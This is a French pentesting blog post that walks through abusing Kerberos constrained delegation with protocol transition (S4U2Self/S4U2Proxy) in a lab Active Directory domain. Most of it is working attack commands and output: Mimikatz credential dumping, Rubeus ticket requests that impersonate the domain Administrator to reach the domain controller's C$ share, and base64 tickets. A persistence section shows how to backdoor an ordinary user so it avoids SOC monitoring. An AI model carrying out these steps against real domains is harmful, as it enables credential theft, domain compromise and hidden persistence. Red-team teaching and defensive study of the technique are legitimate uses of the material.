---
layout: post
title:  "Délégation contrainte Kerberos avec transition de protocole"
date:   2020-11-27
category: Pentesting
excerpt_separator: <!--more-->
---  
*P.S: an english version will be translated soon.*    

Bonjour,  

Aujourd'hui nous allons parler de l'exploitation des extensions de protocole Kerberos [S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) et [S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) afin d'impersonifier un utilisateur privilégié du domaine.  

L'objectif de ce post est de nous concentrer sur la [délégation contrainte avec transition de protocole](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587(v=ws.10)) que nous abrègerons ```T2A4D``` (**TrustedToAuthForDelegation**); comment l'énumérer, comment l'exploiter et s'en servir comme méthode de persistance.  
<!--more-->
Pour ne pas réinventer la roue, vous trouverez un très bon article introduisant la délégation kerberos sur le blog [hackndo](https://beta.hackndo.com/constrained-unconstrained-delegation/).  

# Mise en place de la délégation contrainte avec transition de protocole + msDS-AllowedToDelegateTo  

## Prérequis  

Il y a deux méthodes pour bénéficier des cmdlets ActiveDirectory:  
 1. ```Get-WindowsCapability -Name Rsat.ActiveDirectory* -Online | Add-WindowsCapability -Online```  
    *P.S: peut également se faire offline à partir de l'iso téléchargeable [ici](https://my.visualstudio.com/Downloads/Featured)*
 2. [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)  
  
## TrustedToAuthForDelegation

```srv$``` est un compte machine du domaine.  

```powershell
Get-ADComputer -Identity srv | Set-ADAccountControl -TrustedToAuthForDelegation $True
Set-ADComputer -Identity srv -Add @{'msDS-AllowedToDelegateTo'=@('TIME/DC.WINDOMAIN.LOCAL','TIME/DC')}
```
  
ou via GUI:  
  
![t2a4d]({{ site.url }}/public/images/t2a4d/setup_t2a4d.png)
  
Notons que la délégation contrainte peut également être basée sur la ressource (écriture de la propriété **msds-allowedtoactonbehalfofotheridentity**). Il semble en effet plus cohérent de donner la légitimité à une ressource de décider quelle autre ressource peut lui accéder. Nous reviendrons la dessus par la suite.  
  
Rentrons dans le vif du sujet.  
  
# Enumeration

La première chose intéressante est de pouvoir énumérer les comptes de service concernés par T2A4D :  
```powershell
PS C:\tools> Get-ADObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl


useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
serviceprincipalname     : {WSMAN/SRV, WSMAN/SRV.windomain.local, TERMSRV/SRV, TERMSRV/SRV.windomain.local...}
msds-allowedtodelegateto : {TIME/DC, TIME/DC.WINDOMAIN.LOCAL}
distinguishedname        : CN=SRV,CN=Computers,DC=windomain,DC=local
samaccountname           : SRV$
samaccounttype           : MACHINE_ACCOUNT
```

L'outil [Invoke-Recon](https://github.com/phackt/Invoke-Recon) trouvera tout cela pour vous.  

# Scénario d'attaque  

Nous allons compromettre une machine ```srv$``` dont l'attribut [useraccountcontrol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) possède la valeur **trusted_to_auth_for_delegation**.  

![t2a4d]({{ site.url }}/public/images/t2a4d/recon_t2a4d.png)

La machine ```srv$``` fait tourner un service ```SA``` qui ne gère pas l'authentification Kerberos. Si un utilisateur *whatever* s'authentifie sur ```SA```, **la délégation contrainte avec transition de protocole** va cependant permettre à ```SA``` de demander un ticket de service pour ```SB``` en prenant l'identité de l'utilisateur *whatever*.  

```SB``` est soit dans le champs **msDS-AllowedToDelegateTo** de ```SA```, soit ```SA``` est dans le champs **msds-allowedtoactonbehalfofotheridentity** de ```SB``` (Resource-Based Constrained Delegation).  

Cette délégation va faire intervenir les extensions de protocole **ServiceForUserToSelf** et **ServiceForUserToProxy** :  
 1. **S4U2Self** va simuler l'authentification kerberos et donc la demande de ticket de service pour ```SA``` pour l'utilisateur *whatever*.  
   ```SA``` va en quelque sorte demander un ticket de service pour lui-même pour un utilisateur arbitraire.  
   Il en résulte un ticket de service ```T,sa``` *forwardable* qui pourra ensuite être passé au mécanisme de **S4U2Proxy**, ce dernier utilisé pour la délégation contrainte classique.  

 2. **S4U2Proxy** va utiliser ```T,sa``` comme preuve de l'authentification de *whatever* auprès de ```SA``` et ainsi récupérer un ticket de service *forwarded* pour ```SB```.

 3. L'utilisateur arbitraire *whatever* se connecte au service ```SB```

Si le compte de service ```T2A4D``` faisant tourner ```SA``` a été compromis, nous pouvons générer un ```T,sa``` pour un compte arbitraire (Administrateur du domaine) pour un service autorisé (voir **msDS-AllowedToDelegateTo** ou **msds-AllowedToActOnBehalfOfOtherIdentity**).  

Les [SPNs](https://beta.hackndo.com/service-principal-name-spn/) étant interchangeables (partie non chiffrée du ticket de service), il est possible de modifier ce dernier par un autre SPN du même compte de service (ex: *CIFS/DC* au lieu de *TIME/DC*).  

<pre>
Le compte impersonifié doit pouvoir être délégué.
</pre>
Il ne doit être ni [Protected Users](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), ni "**Account is sensitive and cannot be delegated**".  
  
# <a name="Exploitation"></a>Exploitation  

Il sera nécessaire au préalable de compiler Rubeus (depuis le repo [Rubeus](https://github.com/GhostPack/Rubeus), lancer le projet, ```Build -> Build Solution```).  

On suppose ici que la machine ```srv$``` a été préalablement compromise. On récupère ses credentials :  
```cmd
C:\tools> C:\tools\Mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 19484783 (00000000:0129506f)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/25/2020 10:06:29 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : srv$
         * Domain   : WINDOMAIN
         * NTLM     : b5858035cb595dd82050f9193b220232
         * SHA1     : b7607fdc98a40ae1cfb47478b8d929139d18f6cb
        tspkg :
        wdigest :
         * Username : SRV$
         * Domain   : WINDOMAIN
         * Password : (null)
        kerberos :
         * Username : SRV$
         * Domain   : windomain.local
         * Password : HXEq%dCV$Qp0`b-:LE,zT]x%Sl&G_n8C1eP(aIymKGM-d^E;J5>$uj*0? &duWc:"$tL$KtkJuqE+t[s@fw$#YA:O$Bh<%usYq@vU5 ,i6q^JK=q9bV:Ue?Y
        ssp :
        credman :
...
```

Maintenant il nous faut dérouler les S4U pour générer un ticket de service, non pas pour *TIME/DC*, mais pour *CIFS/DC* pour l'utilisateur **WINDOMAIN\Administrator**.  

Vérifions que le share ```\\DC\C$``` nous est refusé:  
```
C:\tools>dir \\DC\C$
Access is denied.
```

En premier, nous demandons un TGT pour le compte de service compromis ```srv$``` :
```cmd
C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user:srv$ /domain:windomain.local /ntlm:b5858035cb595dd82050f9193b220232 /outfile:srv.tgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: b5858035cb595dd82050f9193b220232
[*] Building AS-REQ (w/ preauth) for: 'windomain.local\srv$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE5DCCBOCgAwIBBaEDAgEWooID9DCCA/BhggPsMIID6KADAgEFoREbD1dJTkRPTUFJTi5MT0NBTKIk
      MCKgAwIBAqEbMBkbBmtyYnRndBsPd2luZG9tYWluLmxvY2Fso4IDpjCCA6KgAwIBEqEDAgECooIDlASC
      A5DCmCD2rczQzoD7RBj3++6B+e7j68hijB0EoPUE87/OBc6Rw5hAPLzcWFJC8sfBuWWywOB/Y4O6Z9Xv
      IKQsk8mypOz33ffprU2NhtGGz9fcuy2oFKonUhUU3QSCgMT16KOfkpt2QYsan9zV4vUJpdEDrRCkdKCx
      +bu+dL63100hpjT8BlOZDsobNBPalaQRo1AihpxPgA48UtsDVB/hG0A4monF5x2wCBsoKy+7MEBi0CAa
      tLDv60ly4eIvRPijEXkN3Zmm/l1wIzWt4WpcGFdpoSTS+VLkgws9zHVCuoQlOGWURjTHRksHjIG6Exkf
      KXyCBCuO6vUxC+DUv3vCVC1wBEs5e7VXtGPhUzd8jJoSVCc+oSv4zXS+NzVf0RTr8ephMHxrXzzpCVQL
      y+3fLU+5/xcnzZiTypBDnjeluHKnlj+cZhQVniQU5PEhGw+DnaL22QZqOPY08VouXUtE44spKsrRGu8N
      qkwqdLVFTDSNNYgUGFGAvUG7QyWeC/XhbYvA5dpM9DUXhVo7ri3A4TZbLSfdrfiy14cOrl6AV8yD1Afo
      +Dks8KELhnba6JWdY6RVgbgXgvwDuy69JKrTPhifpTwEMrvbJejRnM0iD4YwwPTY6qT9xtXDRw5nfb/N
      yd2WZVmwlFsg3JBl0VCNAzfTxyZLhta5s8G8lRJmpBTUPgxWXVleta4v9XGGoWuT0WlmSveXSKrowwLZ
      BhHaSm0/IVRypnWyJYEY+PU7LXOsHDt3arS8WWMUV/niRYEVSIHM86AF5m7VJL52XRXeM45u/jtpWwfL
      b0/Dx0Hma2A/dti+2ns+PyjQxhMxj9iqKwyVAsNYkKlTL8HgD/NqT+Tt2Lh7CnhP6gqIpdQswTUq/XLO
      8FA/ZKtg13mF0A8FqbUKbmcntXc6+oBklkoQAilQSbShmrVuqLAMEoMOnc2l7S0tTGpDlPkNzIzcTk9l
      BdPbVvmWhMOu8JV/SywUW60pO3YpoBu8qpIuHUboFNbzBszDh+N0D9WK8Idt5YSQAqVpRQY01aDiO1H8
      rOq1yrDlShkzNG2pixurvyNsckdRRytESyggACpn12cXOWOOUcQzMyf42m+gyuj4WaoL98elvax0Qz51
      wSFpyoBq4gj1QF+h2RroJabfKBIwemCbeKD7CE5gQEkYLWCjoSNwzYGMEmtVZdDib8nlIRarsqNsrZGF
      RTpD9hg1sjrWJhZ9gjijgdswgdigAwIBAKKB0ASBzX2ByjCBx6CBxDCBwTCBvqAbMBmgAwIBF6ESBBD6
      04gmG9bj12WZbdd2ZJYboREbD1dJTkRPTUFJTi5MT0NBTKIRMA+gAwIBAaEIMAYbBHNydiSjBwMFAEDh
      AAClERgPMjAyMDA5MjUxODA1MDdaphEYDzIwMjAwOTI2MDQwNTA3WqcRGA8yMDIwMTAwMjE4MDUwN1qo
      ERsPV0lORE9NQUlOLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw93aW5kb21haW4ubG9jYWw=

[*] Ticket written to srv.tgt


  ServiceName           :  krbtgt/windomain.local
  ServiceRealm          :  WINDOMAIN.LOCAL
  UserName              :  srv$
  UserRealm             :  WINDOMAIN.LOCAL
  StartTime             :  9/25/2020 6:05:07 PM
  EndTime               :  9/26/2020 4:05:07 AM
  RenewTill             :  10/2/2020 6:05:07 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  +tOIJhvW49dlmW3XdmSWGw==
```

Ensuite ce TGT va nous permettre d'initier le **S4U2Self**. Ensuite interviendra le **S4U2Proxy** comme expliqué précédemment pour le service *CIFS* (*voir /altservice:cifs*) :
```cmd
C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe s4u /ticket:srv.tgt /msdsspn:TIME/DC /impersonateuser:Administrator /domain:windomain.local /altservice:CIFS /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: S4U

[*] Action: S4U

[*] Using domain controller: dc.windomain.local (192.168.38.102)
[*] Building S4U2self request for: 'srv$@WINDOMAIN.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator@WINDOMAIN.LOCAL' to 'srv$@WINDOMAIN.LOCAL'
[*] base64(ticket.kirbi):

      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
      QUlOLkxPQ0FMqREwD6ADAgEBoQgwBhsEc3J2JA==

[+] Ticket successfully imported!
[*] Impersonating user 'Administrator' to target SPN 'TIME/DC'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Using domain controller: dc.windomain.local (192.168.38.102)
[*] Building S4U2proxy request for service: 'TIME/DC'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/dc':

      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
      TE9DQUypFTAToAMCAQKhDDAKGwRjaWZzGwJkYw==
[+] Ticket successfully imported!

```

Nous avons bien notre ticket de service pour **CIFS/DC** au nom de **WINDOMAIN\Administrator** :
```cmd
C:\tools> klist
...
#1>     Client: Administrator @ WINDOMAIN.LOCAL
        Server: cifs/dc @ WINDOMAIN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/25/2020 18:05:46 (local)
        End Time:   9/26/2020 4:05:07 (local)
        Renew Time: 10/2/2020 18:05:07 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
...
```

Testons :
```cmd
C:\tools>dir \\DC\C$
 Volume in drive \\DC\C$ is Windows 2019
 Volume Serial Number is 28C8-9A14

 Directory of \\DC\C$

09/27/2020  08:50 AM    <DIR>          PerfLogs
09/27/2020  08:06 AM    <DIR>          Program Files
09/27/2020  08:00 AM    <DIR>          Program Files (x86)
10/20/2020  01:07 PM    <DIR>          tmp
09/27/2020  08:00 AM    <DIR>          Users
10/20/2020  01:26 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
10/20/2020  01:10 PM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  36,839,563,264 bytes free
```

# <a name="Persistance"></a>Persistance  

Pour positionner l'attribut **TRUSTED_TO_AUTH_FOR_DELEGATION**, il nous faut le privilège **SeEnableDelegationPrivilege**.  

*Fortunately Microsoft protect any user from setting this flag unless they are listed in the User Rights Assignment setting "Enable computer and user accounts to be trusted for delegation" (SeEnableDelegationPrivilege) on the Domain Controller. So by default only members of BUILTIN\Administrators (i.e. Domain Admins/Enterprise Admins) have the right to modify these delegation settings.*
  
Une méthode de persistance intéressante consiste, à partir d'un utilisateur compromis possédant le privilège ```SeEnableDelegationPrivilege```, à positionner la valeur ```TRUSTED_TO_AUTH_FOR_DELEGATION``` sur un autre utilisateur compromis lambda pouvant être délégué, et à éditer le champs ```msDS-AllowedToDelegateTo``` avec le SPN ```CIFS/DC``` par exemple, permettant ainsi de rejouer l'attaque.  
  
## T2A4D sur un utilisateur arbitraire du domaine
  
Vous êtes admin de dom, cependant les [groupes protégés](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory) sont supervisés par le SOC, ces derniers ont leurs descripteurs de sécurité remis en état par le mécanisme de ```SDProp``` ([AdminSDHolder](https://social.technet.microsoft.com/wiki/contents/articles/22331.adminsdholder-protected-groups-and-security-descriptor-propagator.aspx)), etc, autant d'éléments qui vous font dire que vous aimeriez backdoorer un utilisateur qui peut passer le plus de temps possible sous les radars.  
  
Jouons cette méthode dans notre lab. L'utilisateur ```bleponge``` est un utilisateur du domaine tout ce qu'il y a de plus banal, ```admin01``` est ce pour quoi vous avez tant sué ces derniers jours:  
  
```powershell
PS C:\> WMIC OS Get Name
Name
Microsoft Windows 10 Education N|C:\Windows|\Device\Harddisk0\Partition2

PS C:\> whoami
windomain\admin01

PS C:\> net user admin01 /domain | Select-String "Group"

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins

PS C:\> net user bleponge /domain | Select-String "Group"

Local Group Memberships
Global Group memberships     *Domain Users

PS C:\> Get-ADObject -Identity bleponge -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl


useraccountcontrol : NORMAL_ACCOUNT
distinguishedname  : CN=Bob ble. Leponge,CN=Users,DC=windomain,DC=local
samaccountname     : bleponge
samaccounttype     : USER_OBJECT



PS C:\> Get-ADUser -Identity bleponge | Set-ADAccountControl -TrustedToAuthForDelegation $True
PS C:\> Set-ADUSer -Identity bleponge -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/DC.WINDOMAIN.LOCAL','CIFS/DC')}
PS C:\> Set-ADObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
PS C:\> Get-ADObject -Identity bleponge -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl


useraccountcontrol       : NORMAL_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
serviceprincipalname     : nonexistent/BLAHBLAH
msds-allowedtodelegateto : {CIFS/DC, CIFS/DC.WINDOMAIN.LOCAL}
distinguishedname        : CN=Bob ble. Leponge,CN=Users,DC=windomain,DC=local
samaccountname           : bleponge
samaccounttype           : USER_OBJECT
```
  
Attention à la commande ```Set-ADObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}```.  
En effet le bon sens nous dit qu'un utilisateur sera légitime pour déléguer si ce dernier apparait comme compte de service. Sans positionner de SPN sur l'utilisateur ```bleponge```, Rubeus nous a tout simplement propagé une exception, une référence sur un SPN semblant obligatoire:  
```
...
[!] Unhandled Rubeus exception:

System.NullReferenceException: Object reference not set to an instance of an object.
   at Rubeus.S4U.S4U2Proxy(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, Boolean opsec)
   at Rubeus.S4U.Execute(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean s, Boolean opsec, String requestDomain, String impersonateDomain)
   at Rubeus.Commands.S4u.Execute(Dictionary`2 arguments)
   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
```
  
Maintenant vous n'avez plus qu'à retourner sur notre section [Exploitation](#Exploitation) et à tout dérouler dans le contexte de notre utilisateur ```bleponge```.  
  
*En testant avec la classe de service ```HOST``` (HOST/DC), il nous a été impossible de lister notre share ```C$```. Ceci a déjà été rencontré par [pixis](https://beta.hackndo.com/service-principal-name-spn/#cas-particulier---host).*  
  
## SeEnableDelegationPrivilege

Nous pouvons également backdoorer un utilisateur en lui attribuant le privilège ```SeEnableDelegationPrivilege```, cet utilisateur pouvant ainsi positionner le ```TRUSTED_TO_AUTH_FOR_DELEGATION``` sur une autre ressource. Cependant, nous aurons également besoin des droits nécessaires pour écrire le champs ```msDS-AllowedToDelegateTo```.  
    
# The End

N'hésitez pas à commenter / poser vos questions. Vous pouvez également me contacter sur [Twitter](https://twitter.com/phackt_ul).  

Phackt.  
